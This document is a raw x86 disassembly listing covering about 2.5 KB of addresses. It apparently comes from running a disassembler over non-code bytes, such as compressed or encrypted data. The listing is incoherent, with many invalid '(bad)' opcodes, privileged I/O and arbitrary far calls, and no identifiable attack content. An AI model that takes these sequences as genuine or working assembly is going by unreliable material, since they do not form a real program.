  42e4aa:	shl    BYTE PTR [edx-0x50],0xfe
  42e4ae:	xchg   ebp,eax
  42e4af:	dec    edx
  42e4b0:	or     al,0x83
  42e4b2:	mov    ch,BYTE PTR [ebp+0x2c]
  42e4b5:	sbb    eax,0xe77abfee
  42e4ba:	sbb    DWORD PTR [edx-0x35d16b3e],0x50
  42e4c1:	es mov ah,0xb1
  42e4c4:	mov    WORD PTR [edi],gs
  42e4c6:	addr16 dec ecx
  42e4c8:	dec    ebx
  42e4c9:	push   ebp
  42e4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4cb:	int    0xdc
  42e4cd:	nop
  42e4ce:	cmp    BYTE PTR [edx],0x71
  42e4d1:	mov    ecx,DWORD PTR [ebx-0x3a]
  42e4d4:	push   ss
  42e4d5:	sbb    ebx,DWORD PTR ds:0x167ca975
  42e4db:	pop    esp
  42e4dc:	mov    edi,0xb6ac645b
  42e4e1:	inc    edi
  42e4e2:	jge    0x42e4f8
  42e4e4:	mov    DWORD PTR [esi+0x18],esi
  42e4e7:	ds jmp 0x42e4c7
  42e4ea:	adc    BYTE PTR [ebp-0x296079f0],bh
  42e4f0:	out    dx,eax
  42e4f1:	hlt    
  42e4f2:	pop    esi
  42e4f3:	aam    0xb1
  42e4f5:	push   ds
  42e4f6:	pusha  
  42e4f7:	je     0x42e4cc
  42e4f9:	xchg   ecx,eax
  42e4fa:	(bad)  
  42e4fb:	call   0x66ed3545
  42e500:	data16 mov cl,0xbf
  42e503:	mov    esi,0xf001ba34
  42e508:	add    eax,DWORD PTR [edi-0x61]
  42e50b:	je     0x42e531
  42e50d:	ror    DWORD PTR [ecx-0x40],0xe0
  42e511:	cdq    
  42e512:	je     0x42e55e
  42e514:	gs in  al,dx
  42e516:	push   0xf
  42e518:	dec    ebp
  42e519:	and    BYTE PTR [ecx],0x70
  42e51c:	add    ebp,DWORD PTR [ebx-0x24b99aab]
  42e522:	idiv   BYTE PTR [esi+0x1c]
  42e525:	inc    esi
  42e526:	jecxz  0x42e598
  42e528:	and    BYTE PTR [edi+0x67],al
  42e52b:	dec    edi
  42e52c:	sub    eax,0xe61798b8
  42e531:	or     edi,DWORD PTR gs:[ebp-0x5d0697c]
  42e538:	inc    ebx
  42e539:	lds    eax,FWORD PTR [edi+0x6b]
  42e53c:	mov    esp,0x1bb0d5d2
  42e541:	inc    eax
  42e542:	call   0xb46dfec
  42e547:	dec    edx
  42e548:	fs push 0x398ddbc3
  42e54e:	aas    
  42e54f:	clc    
  42e550:	cdq    
  42e551:	(bad)  
  42e552:	xor    edx,DWORD PTR [esi]
  42e554:	add    ah,ah
  42e556:	adc    al,0x99
  42e558:	pop    esp
  42e559:	sub    cl,bl
  42e55b:	aam    0x71
  42e55d:	or     esi,esp
  42e55f:	mov    eax,ds:0x2f7b7b08
  42e564:	or     al,0x66
  42e566:	mov    ds:0xddb67993,al
  42e56b:	or     ebx,0xffffffe3
  42e56e:	cmp    al,0xe
  42e570:	cwde   
  42e571:	cmp    eax,0xfe3ae5dc
  42e576:	in     al,0x36
  42e578:	sbb    bh,bl
  42e57a:	fisubr DWORD PTR [edi-0x432e41a2]
  42e580:	icebp  
  42e581:	sub    ch,dl
  42e583:	inc    DWORD PTR [ebp-0x200c52bb]
  42e589:	popf   
  42e58a:	pusha  
  42e58b:	mov    ebx,0x8a186b7f
  42e590:	or     BYTE PTR [eax],al
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	inc    ecx
  42e601:	xor    al,BYTE PTR [ecx]
  42e603:	inc    esi
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x2000001
  42e60d:	or     eax,0x5ef8601e
  42e612:	xchg   DWORD PTR [esi+0x7c],esi
  42e615:	sar    DWORD PTR [edi-0xa52583f],1
  42e61b:	adc    al,0x13
  42e61d:	add    al,0x78
  42e61f:	fcmovnb st,st(3)
  42e621:	cmp    edi,ecx
  42e623:	fisubr WORD PTR [ebp-0x6ba18dc3]
  42e629:	pop    ss
  42e62a:	fisubr WORD PTR [eax+0x391b0eda]
  42e630:	push   edx
  42e631:	imul   eax,DWORD PTR [ebx+0x332fe730],0xf648fc04
  42e63b:	xchg   ebx,eax
  42e63c:	mov    cl,0x25
  42e63e:	je     0x42e5ce
  42e640:	jb     0x42e60a
  42e642:	push   edi
  42e643:	(bad)  
  42e644:	out    0xe7,al
  42e646:	inc    esi
  42e647:	stos   DWORD PTR es:[edi],eax
  42e648:	(bad)  
  42e649:	adc    BYTE PTR [ecx-0x5f38c43b],al
  42e64f:	or     BYTE PTR [ebx],dh
  42e651:	daa    
  42e652:	push   edi
  42e653:	(bad)  
  42e654:	rcr    eax,cl
  42e656:	test   eax,0xcefdc89
  42e65b:	xchg   edx,eax
  42e65c:	out    dx,al
  42e65d:	cs es xor al,0x1e
  42e661:	and    dl,ah
  42e663:	dec    edx
  42e664:	add    bh,BYTE PTR [esi]
  42e666:	jecxz  0x42e61e
  42e668:	cmc    
  42e669:	ret    
  42e66a:	dec    ebx
  42e66b:	stc    
  42e66c:	and    BYTE PTR [edx-0x71220cff],al
  42e672:	jecxz  0x42e655
  42e674:	popf   
  42e675:	xchg   edx,eax
  42e676:	xor    al,0x6b
  42e678:	sbb    al,0xc7
  42e67a:	sbb    bl,BYTE PTR [esp+eiz*2]
  42e67d:	ficom  DWORD PTR [esi-0x1a]
  42e680:	rcr    ebp,0x17
  42e683:	inc    esi
  42e684:	xchg   ebx,eax
  42e685:	je     0x42e6b3
  42e687:	fwait
  42e688:	push   ds
  42e689:	add    cl,BYTE PTR [ebx]
  42e68b:	sub    al,0x82
  42e68d:	dec    ebp
  42e68e:	mov    al,ds:0x27b687c3
  42e693:	test   DWORD PTR [ebx+0x2],esp
  42e696:	mov    ch,0xa2
  42e698:	jb     0x42e68f
  42e69a:	pop    DWORD PTR [edx+0x5e31bae2]
  42e6a0:	lea    esi,[ecx+0x11ef19c9]
  42e6a6:	test   BYTE PTR [edx],dl
  42e6a8:	ret    0x5238
  42e6ab:	cli    
  42e6ac:	adc    al,0x30
  42e6ae:	fdivr  DWORD PTR [edi-0x2a94d8b4]
  42e6b4:	push   ss
  42e6b5:	and    al,0x29
  42e6b7:	arpl   WORD PTR [esi+0x10],ax
  42e6ba:	xchg   edi,eax
  42e6bb:	ficomp WORD PTR [edx]
  42e6bd:	fmul   DWORD PTR [edx]
  42e6bf:	outs   dx,DWORD PTR ds:[esi]
  42e6c0:	imul   ebx,DWORD PTR [edi],0x2e6eb4ea
  42e6c6:	push   0x2d
  42e6c8:	repnz out 0x6,al
  42e6cb:	cld    
  42e6cc:	xor    bl,BYTE PTR [ebx+0x757783dd]
  42e6d2:	test   al,0x7
  42e6d5:	pusha  
  42e6d6:	scas   al,BYTE PTR es:[edi]
  42e6d7:	outs   dx,BYTE PTR ds:[esi]
  42e6d8:	jnp    0x42e690
  42e6da:	cmp    ch,BYTE PTR [esi-0x707a201c]
  42e6e0:	addr16 push ebp
  42e6e2:	hlt    
  42e6e3:	ins    BYTE PTR es:[edi],dx
  42e6e4:	adc    al,0xcb
  42e6e6:	pop    edx
  42e6e7:	fs pop ss
  42e6e9:	lock mov DWORD PTR [eax+0x62],0xeaa399a0
  42e6f1:	retf   0x6de0
  42e6f4:	mov    bl,BYTE PTR [ebx-0x72]
  42e6f7:	stc    
  42e6f8:	inc    ecx
  42e6f9:	xor    BYTE PTR [ebx+ebp*8-0x4d],bl
  42e6fd:	mov    WORD PTR [edx-0x21],?
  42e700:	rol    DWORD PTR [esi+0x52],cl
  42e703:	xchg   ecx,eax
  42e704:	aas    
  42e705:	icebp  
  42e706:	inc    esp
  42e707:	mov    eax,0x6bfc832d
  42e70c:	xchg   edi,eax
  42e70d:	adc    bh,bl
  42e70f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e710:	retf   0x0
	...
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	fidivr DWORD PTR [edx+0x63f15ae8]
  42e785:	repnz add DWORD PTR [eax],eax
  42e788:	add    eax,0x78000001
  42e78d:	jmp    0x687671b0
  42e792:	and    bl,BYTE PTR [esi+eax*4]
  42e795:	and    al,0x11
  42e797:	push   esi
  42e798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e799:	aam    0xd5
  42e79b:	imul   ecx,edx,0x3
  42e79e:	stos   BYTE PTR es:[edi],al
  42e79f:	dec    edx
  42e7a0:	gs enter 0x8b80,0xe2
  42e7a5:	xor    eax,0x45cb8969
  42e7aa:	sbb    al,0xdf
  42e7ac:	es pop ds
  42e7ae:	or     DWORD PTR [ebp+0x71052963],edi
  42e7b4:	add    bh,dl
  42e7b6:	popa   
  42e7b7:	push   edx
  42e7b8:	and    bh,bh
  42e7ba:	push   ds
  42e7bb:	ss mov eax,0xa8e138eb
  42e7c1:	(bad)  
  42e7c2:	cmp    DWORD PTR [ecx+esi*2],ebx
  42e7c5:	mov    esp,0xb3839440
  42e7ca:	inc    DWORD PTR [eax]
  42e7cc:	(bad)  
  42e7cd:	(bad)  [esi+ecx*4]
  42e7d0:	test   ecx,eax
  42e7d2:	(bad)  [ebx+0x5e5ef758]
  42e7d8:	stos   BYTE PTR es:[edi],al
  42e7d9:	mov    esi,0xfac65a7
  42e7de:	xchg   ebp,ebx
  42e7e0:	or     ah,BYTE PTR [esi+0x3c]
  42e7e3:	add    ch,BYTE PTR [edi+0x3]
  42e7e6:	daa    
  42e7e7:	push   cs
  42e7e8:	lock daa 
  42e7ea:	add    bl,BYTE PTR [ebx-0x352b91b0]
  42e7f0:	and    eax,0xa93f1102
  42e7f5:	outs   dx,DWORD PTR ds:[esi]
  42e7f6:	call   0x3e9d:0x7e62f0d1
  42e7fd:	(bad)  
  42e7fe:	or     ecx,DWORD PTR [edi]
  42e800:	sub    BYTE PTR [edi+edi*1+0xdf748ba],dh
  42e807:	popf   
  42e808:	mov    dh,dl
  42e80a:	fs loop 0x42e7f5
  42e80d:	mov    esi,DWORD PTR [esi]
  42e80f:	fldcw  WORD PTR [edx+esi*2-0x35]
  42e813:	cmp    DWORD PTR [ebx+0x74],esp
  42e816:	icebp  
  42e817:	mov    al,0x91
  42e819:	mov    cl,BYTE PTR [ebp-0x79]
  42e81c:	mov    ah,0xa0
  42e81e:	imul   ebp,DWORD PTR [edi-0x453035dc],0x63
  42e825:	jno    0x42e81a
  42e827:	js     0x42e7cb
  42e829:	call   0x3cd6:0xf52f1fca
  42e830:	jl     0x42e7bb
  42e832:	sub    ebp,edi
  42e834:	aad    0xdb
  42e836:	cli    
  42e837:	jbe    0x42e888
  42e839:	push   ebp
  42e83a:	aaa    
  42e83b:	popf   
  42e83c:	pushf  
  42e83d:	iret   
  42e83e:	loope  0x42e7fd
  42e840:	fsub   st,st(6)
  42e842:	es dec ebp
  42e844:	cdq    
  42e845:	sbb    al,0xc1
  42e847:	(bad)  
  42e848:	mov    ebp,0x67ea80fe
  42e84d:	fwait
  42e84e:	and    al,BYTE PTR [eax+ecx*4+0x17dc70fb]
  42e855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e856:	outs   dx,BYTE PTR ds:[esi]
  42e857:	dec    esp
  42e858:	repz xlat BYTE PTR ds:[ebx]
  42e85a:	lahf   
  42e85b:	arpl   WORD PTR [ecx-0x77],ax
  42e85e:	push   es
  42e85f:	mov    ch,0xbd
  42e861:	mov    dh,BYTE PTR [eax+0x7f]
  42e864:	in     al,0xec
  42e866:	jl     0x42e87f
  42e868:	and    dl,BYTE PTR [eax+0x13253d19]
  42e86e:	xchg   edx,eax
  42e86f:	and    al,0xa5
  42e871:	sub    BYTE PTR [edx-0x2d],bl
  42e874:	(bad)  
  42e876:	sbb    edi,edi
  42e878:	aaa    
  42e879:	sub    dh,dl
  42e87b:	shr    DWORD PTR [edx+0x5596d82e],0x4b
  42e882:	aaa    
  42e883:	mov    ds:0x66f192ad,al
  42e888:	pop    ebp
  42e889:	int    0x7a
  42e88b:	bound  esi,QWORD PTR [ebp-0xe37b9ab]
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0xdc07d5]
  42e901:	push   ds
  42e902:	repz retf 0xf368
  42e906:	add    DWORD PTR [eax],eax
  42e908:	add    eax,0xb1000001
  42e90d:	test   DWORD PTR [ebx-0x31a198a8],0x7c6128cd
  42e917:	stos   BYTE PTR es:[edi],al
  42e918:	jns    0x42e8be
  42e91a:	imul   esi,DWORD PTR [esi],0xf0f30d14
  42e920:	sbb    BYTE PTR ds:0x1ca00db9,cl
  42e926:	sbb    eax,0xf041828b
  42e92b:	pop    esi
  42e92c:	(bad)  
  42e92d:	les    ebx,FWORD PTR [esi+eiz*8]
  42e930:	dec    esi
  42e931:	bnd jl 0x42e95f
  42e934:	xchg   esp,eax
  42e935:	adc    bh,BYTE PTR [ecx+0x66]
  42e938:	inc    ebx
  42e939:	in     al,0xa7
  42e93b:	jmp    0x3b834181
  42e940:	sahf   
  42e941:	mov    dl,0xb6
  42e943:	mov    cl,0xa6
  42e945:	(bad)  [edi+0x39]
  42e948:	xor    eax,0x8fc63a69
  42e94d:	dec    edi
  42e94e:	mov    BYTE PTR [edi+ebx*8+0x37],ah
  42e952:	push   esp
  42e953:	mov    edi,0xea69036e
  42e958:	in     al,dx
  42e959:	iret   
  42e95a:	and    DWORD PTR [edx+ebx*1],ebp
  42e95d:	push   ds
  42e95e:	jae    0x42e8ee
  42e960:	test   BYTE PTR [ebx],bh
  42e962:	daa    
  42e963:	and    esp,esp
  42e965:	mov    ah,0x3
  42e967:	xlat   BYTE PTR ds:[ebx]
  42e968:	inc    BYTE PTR [edx+0x4d]
  42e96b:	daa    
  42e96c:	xor    BYTE PTR [esi+0x3c],dl
  42e96f:	xlat   BYTE PTR ds:[ebx]
  42e970:	sbb    BYTE PTR [eax],0x84
  42e973:	sar    BYTE PTR [edx-0x49a96466],1
  42e979:	repnz xor eax,0xd9e282c
  42e97f:	sbb    al,0xac
  42e981:	or     ecx,DWORD PTR [esi-0x43af8791]
  42e987:	call   0x1b14:0x2f7fde20
  42e98e:	inc    esi
  42e98f:	sbb    BYTE PTR [esi-0x44],cl
  42e992:	cmp    bh,0x8d
  42e995:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42e997:	jns    0x42ea14
  42e999:	enter  0x9ea5,0xaf
  42e99d:	sub    DWORD PTR [edx+0x1],esp
  42e9a0:	outs   dx,DWORD PTR ds:[esi]
  42e9a1:	push   ebx
  42e9a2:	stc    
  42e9a3:	adc    DWORD PTR [ecx+0x45bc1dc7],edi
  42e9a9:	aam    0xfa
  42e9ab:	fcomp  DWORD PTR [edx]
  42e9ad:	ja     0x42e970
  42e9af:	outs   dx,BYTE PTR ds:[esi]
  42e9b0:	push   ebp
  42e9b1:	dec    ecx
  42e9b2:	mov    bl,0xe8
  42e9b4:	cs sbb esi,ebx
  42e9b7:	(bad)  
  42e9b8:	jmp    0x74cc:0x566556d7
  42e9bf:	cmp    BYTE PTR [edx+0x68d52752],al
  42e9c5:	sbb    DWORD PTR [ebp-0x70],ecx
  42e9c8:	popf   
  42e9c9:	loopne 0x42e975
  42e9cb:	dec    eax
  42e9cc:	out    dx,eax
  42e9cd:	cli    
  42e9ce:	test   ebp,eax
  42e9d0:	ins    BYTE PTR es:[edi],dx
  42e9d1:	arpl   WORD PTR [ecx+ebp*4+0x2cab20af],dx
  42e9d8:	dec    ebp
  42e9d9:	or     dh,al
  42e9db:	(bad)  
  42e9dc:	pop    ds
  42e9dd:	test   eax,0x9e9b050b
  42e9e2:	pop    esp
  42e9e3:	or     bh,BYTE PTR [eax+0x52]
  42e9e6:	adc    edi,esp
  42e9e8:	bound  esi,QWORD PTR [si]
  42e9eb:	ins    DWORD PTR es:[edi],dx
  42e9ec:	mov    BYTE PTR [eax],ch
  42e9ee:	dec    esi
  42e9ef:	sub    eax,0x71c460b8
  42e9f4:	dec    ebp
  42e9f5:	arpl   WORD PTR [ecx+0x606896ab],bp
  42e9fb:	mov    bl,0x1a
  42e9fd:	xchg   esi,eax
  42e9fe:	scas   eax,DWORD PTR es:[edi]
  42e9ff:	dec    esp
  42ea00:	xchg   esi,eax
  42ea01:	jno    0x42e9fc
  42ea03:	test   al,0x15
  42ea05:	cmp    al,0x4
  42ea07:	push   ds
  42ea08:	add    BYTE PTR [eax+0x68c7954b],dl
  42ea0e:	add    esi,esp
  42ea10:	mov    BYTE PTR [eax],0x0
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	inc    esi
  42ea81:	sahf   
  42ea82:	add    esp,esi
  42ea84:	ins    DWORD PTR es:[edi],dx
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x67000001
  42ea8d:	xor    esp,esp
  42ea8f:	in     al,0xc1
  42ea91:	lods   al,BYTE PTR ds:[esi]
  42ea92:	cdq    
  42ea93:	adc    dh,BYTE PTR [edx+0x1868d368]
  42ea99:	imul   ebp,DWORD PTR [ebp+0x4c],0xc8098084
  42eaa0:	adc    esp,DWORD PTR [ecx+0x261fe477]
  42eaa6:	push   ecx
  42eaa7:	push   edi
  42eaa8:	add    edi,DWORD PTR [esi+0x5fd2aeca]
  42eaae:	jmp    0xd1bc8022
  42eab3:	cmp    edx,DWORD PTR [ebp-0x43]
  42eab6:	in     eax,0xf2
  42eab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eab9:	(bad)  
  42eaba:	add    BYTE PTR ds:0x5ed09a65,0x63
  42eac1:	pop    ds
  42eac2:	adc    ah,ch
  42eac4:	pop    esi
  42eac5:	mov    BYTE PTR [esi],bl
  42eac7:	adc    BYTE PTR [ebx+0x49],dh
  42eaca:	je     0x42eaec
  42eacc:	mov    DWORD PTR [esi+0x4f44e837],esp
  42ead2:	and    dl,BYTE PTR [eax+eax*8]
  42ead5:	mov    dh,0x4f
  42ead7:	xchg   ecx,eax
  42ead8:	outs   dx,BYTE PTR ds:[esi]
  42ead9:	stos   BYTE PTR es:[edi],al
  42eada:	sbb    eax,0xea69835d
  42eadf:	test   DWORD PTR [ecx-0x31],edx
  42eae2:	jae    0x42eb53
  42eae4:	push   0xffffffe2
  42eae6:	adc    BYTE PTR [ecx+0x7],cl
  42eae9:	shl    BYTE PTR [ecx-0x79c86b5e],1
  42eaef:	cmp    edx,edi
  42eaf1:	into   
  42eaf2:	inc    edi
  42eaf3:	int3   
  42eaf4:	mov    esi,0xf26ab589
  42eaf9:	ror    BYTE PTR [ecx],1
  42eafb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eafc:	adc    DWORD PTR [edx+0x594cc83],edx
  42eb02:	(bad)  
  42eb03:	test   eax,0x44bb80c4
  42eb08:	(bad)  [edx]
  42eb0a:	sub    eax,0xb4e1c232
  42eb0f:	xchg   edx,eax
  42eb10:	in     al,0x16
  42eb12:	ss and eax,0xd03c082a
  42eb18:	sti    
  42eb19:	call   0xacd1:0x55b28775
  42eb20:	add    dh,BYTE PTR [ebx]
  42eb22:	xor    al,0x7c
  42eb24:	test   al,0x38
  42eb26:	daa    
  42eb27:	jb     0x42ead3
  42eb29:	pop    esp
  42eb2a:	mov    eax,0xf18cd0b6
  42eb2f:	adc    DWORD PTR [esi+0x40],0xfffffffe
  42eb33:	imul   ebx,edx,0x6db05ee6
  42eb39:	push   esp
  42eb3a:	cwde   
  42eb3b:	push   esp
  42eb3c:	or     edi,edi
  42eb3e:	popf   
  42eb3f:	mov    bl,0xb3
  42eb41:	stc    
  42eb42:	sub    eax,0xb59dbde6
  42eb47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb48:	add    al,0x82
  42eb4a:	mov    edi,0x40a77259
  42eb4f:	ins    BYTE PTR es:[edi],dx
  42eb50:	xchg   esp,eax
  42eb51:	xchg   DWORD PTR [esi+0x23],edi
  42eb54:	std    
  42eb55:	retf   
  42eb56:	outs   dx,BYTE PTR ds:[esi]
  42eb57:	adc    BYTE PTR [esi+0x65],0x54
  42eb5b:	scas   eax,DWORD PTR es:[edi]
  42eb5c:	push   edi
  42eb5d:	addr16 cmc 
  42eb5f:	and    BYTE PTR [ebx+0x26],0xcc
  42eb63:	xchg   esp,eax
  42eb64:	nop
  42eb65:	mov    ?,WORD PTR [esi+eax*8-0x36]
  42eb69:	es jbe 0x42eb08
  42eb6c:	test   BYTE PTR [ebx+edx*1+0xada6b2e],al
  42eb73:	retf   
  42eb74:	shl    BYTE PTR [ebp-0x57],0xf2
  42eb78:	inc    ecx
  42eb79:	daa    
  42eb7a:	adc    eax,0x85a47672
  42eb7f:	adc    dh,0x18
  42eb82:	cmp    BYTE PTR [edx-0x243d374f],ah
  42eb88:	cwde   
  42eb89:	pop    ebp
  42eb8a:	mov    bh,0x67
  42eb8c:	pusha  
  42eb8d:	sti    
  42eb8e:	sahf   
  42eb8f:	jmp    0x42ec64
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sub    DWORD PTR [eax+0x723f54b7],0x50001f5
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [esi-0x56],dh
  42ec0e:	push   es
  42ec0f:	popf   
  42ec10:	loopne 0x42ec80
  42ec12:	pushf  
  42ec13:	aas    
  42ec14:	int    0x2e
  42ec16:	push   ss
  42ec17:	pop    esi
  42ec18:	aas    
  42ec19:	sbb    eax,0x4d0e7d61
  42ec1e:	stos   DWORD PTR es:[edi],eax
  42ec1f:	retf   
  42ec20:	jl     0x42ebbc
  42ec22:	jb     0x42ec2f
  42ec24:	mov    ebp,0x515b8c2e
  42ec29:	int3   
  42ec2a:	clc    
  42ec2b:	fisub  WORD PTR [ebx-0x8]
  42ec2e:	shr    BYTE PTR [edi],cl
  42ec30:	mov    ch,0xa
  42ec32:	outs   dx,DWORD PTR ds:[esi]
  42ec33:	or     edx,DWORD PTR [ebx-0x4ca4314d]
  42ec39:	out    0x15,al
  42ec3b:	sbb    edx,DWORD PTR [ebp-0x1]
  42ec3e:	xor    DWORD PTR [ebx-0x6a99dfa4],ebp
  42ec44:	gs xor eax,0xa1193dfd
  42ec4a:	ds inc eax
  42ec4c:	jae    0x42ecc9
  42ec4e:	jne    0x42ec71
  42ec50:	dec    esp
  42ec51:	cld    
  42ec52:	fmul   QWORD PTR [eax]
  42ec54:	and    bl,bl
  42ec56:	xchg   esp,eax
  42ec57:	popa   
  42ec58:	test   BYTE PTR [esi],0x28
  42ec5b:	xor    edx,ebx
  42ec5d:	adc    ecx,esp
  42ec5f:	adc    BYTE PTR [esi-0x29],0xc
  42ec63:	dec    edi
  42ec64:	pop    ebx
  42ec65:	call   0x1bd6db6f
  42ec6a:	call   0x5162:0x2d49f9af
  42ec71:	cpuid  
  42ec73:	popf   
  42ec74:	fwait
  42ec75:	push   es
  42ec76:	xlat   BYTE PTR ds:[ebx]
  42ec77:	fwait
  42ec78:	lea    ebx,[edi+0x52]
  42ec7b:	cmp    cx,sp
  42ec7e:	loop   0x42ec9b
  42ec80:	xlat   BYTE PTR ds:[ebx]
  42ec81:	xor    al,0x1f
  42ec83:	pop    esi
  42ec84:	div    DWORD PTR [ebp-0x16]
  42ec87:	loop   0x42ec09
  42ec89:	aam    0x6f
  42ec8b:	sub    DWORD PTR [edx+0x73],ebx
  42ec8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec8f:	mov    al,ds:0x2fcf11c8
  42ec94:	ret    
  42ec95:	and    DWORD PTR [ecx+0x4fae74ea],esp
  42ec9b:	xor    al,0xaf
  42ec9d:	pop    edi
  42ec9e:	xchg   ebp,eax
  42ec9f:	out    0xbf,al
  42eca1:	inc    ebp
  42eca2:	je     0x42ec8a
  42eca4:	leave  
  42eca5:	jbe    0x42ecd7
  42eca7:	push   eax
  42eca8:	addr16 mov dl,0x6b
  42ecab:	mov    ecx,DWORD PTR [edx+0x5ed48391]
  42ecb1:	(bad)  
  42ecb2:	pop    edx
  42ecb3:	pop    eax
  42ecb4:	mov    ch,0x2e
  42ecb6:	mov    eax,0x7b8d60dc
  42ecbb:	imul   esp,DWORD PTR [ebx],0x1e1f37f1
  42ecc1:	ja     0x42ec9a
  42ecc3:	jnp    0x42ed28
  42ecc5:	aam    0x49
  42ecc7:	fbstp  TBYTE PTR [edx+esi*4-0x3a48aa66]
  42ecce:	scas   al,BYTE PTR es:[edi]
  42eccf:	test   ebp,edi
  42ecd1:	idiv   BYTE PTR [esi]
  42ecd3:	in     al,0xc9
  42ecd5:	shr    edi,cl
  42ecd7:	mov    WORD PTR [edx-0x23b2ce8a],?
  42ecdd:	icebp  
  42ecde:	out    0xb7,eax
  42ece0:	xchg   ecx,eax
  42ece1:	aas    
  42ece2:	mov    eax,0x3c3765a7
  42ece7:	ret    
  42ece8:	test   BYTE PTR [esp-0x7fdb0a1b],dh
  42ecef:	aas    
  42ecf0:	fcmovnbe st,st(1)
  42ecf2:	cld    
  42ecf3:	div    esp
  42ecf5:	or     ch,BYTE PTR [eax-0x63]
  42ecf8:	mov    edx,0xa8c1c346
  42ecfd:	cmp    cl,bl
  42ecff:	lds    edx,FWORD PTR [eax+0x1a5e5103]
  42ed05:	retf   0xcee0
  42ed08:	std    
  42ed09:	test   DWORD PTR [ebx+0x2b116797],ecx
  42ed0f:	xlat   BYTE PTR ds:[ebx]
  42ed10:	and    al,0x0
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x19131cc6],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x79000001
  42ed8d:	xchg   edx,eax
  42ed8e:	push   esp
  42ed8f:	stos   BYTE PTR es:[edi],al
  42ed90:	add    ah,ch
  42ed92:	cwde   
  42ed93:	sub    bl,BYTE PTR [ecx]
  42ed95:	imul   edx,edi,0x4e8ff0c3
  42ed9b:	popf   
  42ed9c:	xchg   esi,eax
  42ed9d:	push   edx
  42ed9e:	push   eax
  42ed9f:	(bad)  
  42eda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eda2:	pop    ds
  42eda3:	inc    ecx
  42eda4:	sbb    al,0x8e
  42eda6:	es (bad) 
  42eda8:	push   0xffffffb7
  42edaa:	push   ecx
  42edab:	pusha  
  42edac:	loopne 0x42edab
  42edae:	fdiv   QWORD PTR [ebx]
  42edb0:	mov    eax,ds:0x12f37187
  42edb6:	mov    BYTE PTR [ebx],ah
  42edb8:	fs mov ebp,eax
  42edbb:	call   0x1ca4db89
  42edc0:	jne    0x42ed52
  42edc2:	popa   
  42edc3:	sar    DWORD PTR [edx+0xb],0x48
  42edc7:	xor    al,0x44
  42edc9:	cmp    ecx,DWORD PTR [ecx+0x1edbe3e]
  42edcf:	stos   DWORD PTR es:[edi],eax
  42edd0:	daa    
  42edd1:	ror    BYTE PTR [esi-0x712302d0],1
  42edd7:	fistp  WORD PTR [esi-0x43714f56]
  42eddd:	jae    0x42ee16
  42eddf:	sti    
  42ede0:	arpl   si,dx
  42ede2:	and    eax,0x51e0d0cf
  42ede7:	popa   
  42ede8:	add    dh,0xce
  42edeb:	loope  0x42edd7
  42eded:	inc    eax
  42edee:	sar    DWORD PTR [edx-0x168ad728],0xd7
  42edf5:	or     eax,0xd617001e
  42edfa:	mov    ah,0xfb
  42edfc:	dec    DWORD PTR [esi]
  42edfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42edff:	cdq    
  42ee00:	in     eax,0x96
  42ee02:	out    0xab,al
  42ee04:	imul   ebp,esi,0xf1eddd01
  42ee0a:	pop    esi
  42ee0b:	and    al,0xee
  42ee0d:	dec    esi
  42ee0e:	and    eax,0x62ec180f
  42ee13:	inc    eax
  42ee14:	loope  0x42ee02
  42ee16:	test   bh,bl
  42ee18:	add    bh,BYTE PTR [edx-0x600d85f4]
  42ee1e:	mov    ebx,0xf57a8afd
  42ee23:	and    dh,BYTE PTR [ebx]
  42ee25:	jmp    0xaa945844
  42ee2a:	dec    esi
  42ee2b:	fisub  DWORD PTR [ecx+0x35]
  42ee2e:	imul   eax,edi,0x64755863
  42ee34:	shl    DWORD PTR [ebx-0x30],cl
  42ee37:	arpl   WORD PTR [edi],dx
  42ee39:	lods   al,BYTE PTR ds:[esi]
  42ee3a:	cmp    ah,BYTE PTR [esi+eax*2]
  42ee3d:	sbb    dl,BYTE PTR [edi+0x1f]
  42ee40:	pop    ds
  42ee41:	push   0x6a
  42ee43:	shl    BYTE PTR [ecx-0x17897cb6],0x4
  42ee4a:	push   ds
  42ee4b:	cwde   
  42ee4c:	mov    al,ds:0x76423713
  42ee51:	mov    dh,0x19
  42ee53:	mov    edx,0x70a04628
  42ee58:	xor    al,0xa2
